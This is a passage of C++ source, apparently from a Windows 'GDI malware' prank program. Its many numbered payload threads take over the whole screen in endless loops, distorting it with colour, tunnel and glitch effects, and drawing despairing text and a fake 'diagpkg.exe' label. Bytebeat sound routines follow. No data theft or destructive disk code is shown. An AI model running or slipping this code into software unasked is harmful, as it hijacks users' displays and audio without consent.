	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload9_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				float fx = i & 16384 ? (((x + (i * 8)) - (y ^ (i & 8))) ^ ((x << 2) & (y >> 1))) : (((x + (i * 8)) + (y ^ (i & 8))) & ((x << 2) & (y >> 1)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 1500.f + y / h * .2f, .7f);
				hslcolor.s = 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload9_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	while (true)
	{
		hdc = GetDC(0);
		int x = rand() % 6, y = rand() % 6, x2 = rand() % 6, y2 = rand() % 6;
		DWORD ROP[12] = { SRCCOPY,SRCPAINT,SRCAND,SRCINVERT,SRCERASE,NOTSRCCOPY,NOTSRCERASE,MERGECOPY,MERGEPAINT,PATPAINT,PATINVERT,DSTINVERT };
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		StretchBlt(hdc, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		StretchBlt(hdc, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdc, rand() % w, rand() % h, rand() % w, rand() % h, ROP[rand() % 12]);
		DeleteObject(hbrush);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}
DWORD WINAPI Payload10_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 0, yyy = 0;
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* pBits = nullptr;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w; i++) { StretchBlt(hdcCopy, i, -2 + (rand() % 5), 1, h, hdcCopy, i, 0, 1, h, SRCCOPY); }
		for (int i = 0; i < h; i++) { StretchBlt(hdcCopy, -2 + (rand() % 5), i, w, 1, hdcCopy, 0, i, w, 1, SRCCOPY); }
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x + y * w;
				double wave = (acot(cotf((x + xxx) * 0.04f))) + (acot(cotf((y + yyy) * 0.04f)));
				pBits[index].rgbRed += (480 * round(cotl(wave)) * 0.6f);
				pBits[index].rgbGreen -= (480 * round(logbl(wave)) * 0.6f);
				pBits[index].rgbBlue += (480 * round(fabsl(wave)) * 0.6f);
			}
		}
		BLENDFUNCTION blend = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(0, hdc);
		Sleep(1);
		xxx += 8;
		yyy += 4;
		yyy >>= 2;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), t = 0;
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
	PRGBQUAD rgbquad = { 0 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) {
			for (int x = 0; x < w; x++) {
				rgbquad[y].rgb ^= y - 8 | x;
				rgbquad[x + w * y].rgb = RGB((rgbquad[y].r - rgbquad[y].g + rgbquad[y].b) / 3 + t + (x | y), (rgbquad[y].r + rgbquad[y].g + rgbquad[y].b) / 3 + t + (x | y), (rgbquad[y].r - rgbquad[y].g - rgbquad[y].b) / 3 + t + (x | y));
			}
		}
		t += 20;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload12_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * cot(x - (y ^ x))) >> (((i * i) + ((x ^ y) / 100)) * 10);
				int fxCopy = (x / 2) ^ (2 - x) >> (log10(x + y) ? (x & y) : (y % (x + 3)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.005033f;
				hslcolor.l = fmod(hslcolor.l + (fxCopy % 25) / 100.0f, 2.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload12_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdc, rand() % w, rand() % 100 - 1, rand() % 100, h, hdc, rand() % w, 0, MERGEPAINT);
		BitBlt(hdc, rand() % 100 - 1, rand() % h, w, rand() % 100, hdc, 0, rand() % h, NOTSRCERASE);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		BitBlt(hdc, rand() % w, rand() % 100 - 1, rand() % 100, h, hdc, rand() % w, 0, PATCOPY);
		BitBlt(hdc, rand() % 100 - 1, rand() % h, w, rand() % 100, hdc, 0, rand() % h, PATPAINT);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(99);
	}
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* pBits = NULL;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;
				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;
				BYTE fractalRed = ((i ^ 4) + (i * 4) * round(cot(x ^ ~y)));
				BYTE fractalGreen = ((i ^ 4) + (i * 4) * round(cot((x * (x + i)) ^ (~((y * y) - i) >> x * y) + i)));
				BYTE fractalBlue = ((i ^ 4) + (i * 4) * round(cot((x & y) | (~x >> y))));
				pBits[index].rgbRed = static_cast<BYTE>(2 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(1 * fractalGreen + 1 * originalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(1.5 * fractalBlue + 0.5 * originalBlue);
				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.5);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.5));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.5);
				pBits[index].rgbRed = static_cast<BYTE>(0.5 * fractalBlue + 0.5 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalRed + 0.5 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * fractalGreen + 0.5 * fractalRed);
			}
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		i++;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload15_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		DWORD rop[12] = { SRCCOPY, SRCPAINT, SRCAND, SRCINVERT, MERGECOPY, MERGEPAINT, NOTSRCCOPY, NOTSRCERASE, PATCOPY, PATPAINT, PATINVERT, DSTINVERT };
		int mode[4] = { BLACKONWHITE, COLORONCOLOR, HALFTONE, WHITEONBLACK };
		SetStretchBltMode(hdc, mode[rand() % 4]);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, rop[rand() % 12]);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload15_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	double angle = 0;
	while (true)
	{
		hdc = GetDC(0);
		for (float i = w; i > 0; i -= 0.99f) {
			int a = round(acot(cotf(angle))) * 114;
			BitBlt(hdc, i, 0, 1, h, hdc, i, a, SRCCOPY);
			angle += PI / 51.4;
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload15_num3(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true) {
		hdc = GetDC(0);
		HFONT hfnt = CreateFontA(rand() % 114, rand() % 51, 10 * (rand() % 360), 0, FW_SEMIBOLD, 0, true, true, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, hfnt);
		LPCSTR things[] = {
			"diagpkg.exe",
			"I fell soooo trapped.",
			"being rotten......",
			"why bother?",
			"regretting my choice",
			"begging for mercy",
			"the nightmare is coming",
			"I'm such a big failure",
			"hopelessness",
			"no freedom here.",
			"without any sense",
			"destroy me, plzzzzzz",
			"the body is being petrified.",
			"nobody here."
		};
		int thing = rand() % _countof(things);
		SetBkColor(hdc, RndRGB);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload16_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 2;
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* pBits = nullptr;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x + y * w;
				double wave = sinf(roundf(cotf(x + xxx)) * 0.04f) + cosf(roundf(sqrtf(y + xxx)) * 0.04f);
				pBits[index].rgbRed -= (256 * fabsf(wave) * 0.8f);
				pBits[index].rgbGreen += (256 * tanhf(wave) * 0.8f);
				pBits[index].rgbBlue *= (256 * log2f(wave) * 0.8f);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		xxx += 6;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload17_num1(LPVOID lpParam)//credits to UltraDasher965, but i modified it
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = {};
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	void* pixels = nullptr;
	HBITMAP bmp = CreateDIBSection(hdcCopy, &bmi, DIB_RGB_COLORS, &pixels, NULL, 0);
	SelectObject(hdc, hdcCopy);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	RGBQUAD* buffer = (RGBQUAD*)pixels;
	double t = 0.f;
	while (true)
	{
		hdc = GetDC(0);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				double fx = x / 100.f;
				double fy = y / 100.f;
				double v = floor(tan(fx + t)) + floor(tan(fy + t)) + floor(cot((fx + fy + t) / 2.0));
				int r = (int)(127.5f * round(1 + fabs(v + t - 3)));
				int g = (int)(127.5f * round(1 + fabs(v + t + 2)));
				int b = (int)(127.5f * round(1 + fabs(v + t + 4)));
				buffer[y * w + x] = { (BYTE)b, (BYTE)g, (BYTE)r, 0 };
			}
		}
		t += 0.06f;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload17_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		hdc = GetDC(0);
		int x = rand() % w, y = rand() % h, i = (rand() % 18) * 20;
		for (int a = i; a <= i + 180; a += 10) {
			double IcoX = x + (cos(a * (PI / 180)) * 500), IcoY = y + (sin(a * (PI / 180)) * 500);
			DrawIcon(hdc, IcoX, IcoY, LoadCursor(NULL, lpCursorNames[rand() % 16]));
			Sleep(10);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0;
}
DWORD WINAPI Payload18_num1(LPVOID lpParam)
{
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	double angle = 0.0f, zoom = 1.0f;
	DWORD* data = new DWORD[4 * w * h];
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		GetBitmapBits(bmp, 4 * w * h, data);
		for (int w2 = 0; w2 < w; w2++) {
			for (int h2 = 0; h2 < h; h2++) {
				int cw = w2 - (w / 2), ch = h2 - (h / 2);
				int zw = (int)((cw * cos(angle) - ch * sin(angle)) / zoom), zh = (int)((cw * sin(angle) + ch * cos(angle)) / zoom);
				data[h2 * w + w2] += COLORHSV((cbrtl(zw * zw - zh * zh)) + (log1pl(zw * zw * zh * zh)));
			}
		}
		SetBitmapBits(bmp, 4 * w * h, data);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1);
		zoom += 0.05033f;
		angle += 0.09f;
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload18_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	double angle = 0;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (float i = 0; i < w; i += 0.99f) {
			int a = asin(cosf(angle)) * 44;
			BitBlt(hdcCopy, i, 0, 1, h, hdcCopy, i, a, SRCCOPY);
			angle += PI / 800;
		}
		for (float i = 0; i < h; i += 0.99f) {
			int a = asin(cosf(angle)) * 44;
			BitBlt(hdcCopy, 0, i, w, 1, hdcCopy, a, i, SRCCOPY);
			angle += PI / 800;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload19_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int Xii = abs(x + y * i), Yii = abs(i + y & i);
				int fx = (int)((i * 8) + (i * 8) * cbrt(((Xii + i) ^ (Yii + i)) | (Yii + i)));
				int fxCopy = (int)floor(fabs((Xii - i) + (Yii >> i)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 400.f + y / h * .2f, 1.f);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0f + 0.09f, 1.0f);
				hslcolor.s -= 0.1f;
				hslcolor.l = fmod(hslcolor.l + (fxCopy % 25) / 100.0f, 2.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload20_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].r *= (i >> (w & x)) & i / 2;
			rgbScreen[i].g += (x ^ y) | (i * i / 12);
			rgbScreen[i].b ^= (x * (y & x)) >> i - (x / h);
		}
		BitBlt(hdcCopy, rand() % 4, rand() % 4, w, h, hdcCopy, rand() % 4, rand() % 4, SRCAND);
		BitBlt(hdcCopy, 1, -1, w, h, hdcCopy, 2, -2, SRCERASE);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload21_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* pBits = NULL;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	int i = 0;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;
				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;
				BYTE fractalRed = ((x ^ y) >> (i * 8)) * random();
				BYTE fractalGreen = ((x ^ y) + (i * 8)) * random();
				BYTE fractalBlue = ((x ^ y) | (i * 8)) * random();
				pBits[index].rgbRed = static_cast<BYTE>(2 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(1 * fractalGreen + 1 * originalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(1.5 * fractalBlue + 0.5 * originalBlue);
				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.5);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.5));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.5);
				pBits[index].rgbRed = static_cast<BYTE>(0.5 * fractalBlue + 0.5 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalRed + 0.5 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * fractalGreen + 0.5 * fractalRed);
			}
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		i++;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 5033, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((~t * cos(t | 7) * 9.1));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * sin((t >> 12 | (t * (random() % 24))) & 63 & t >> 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
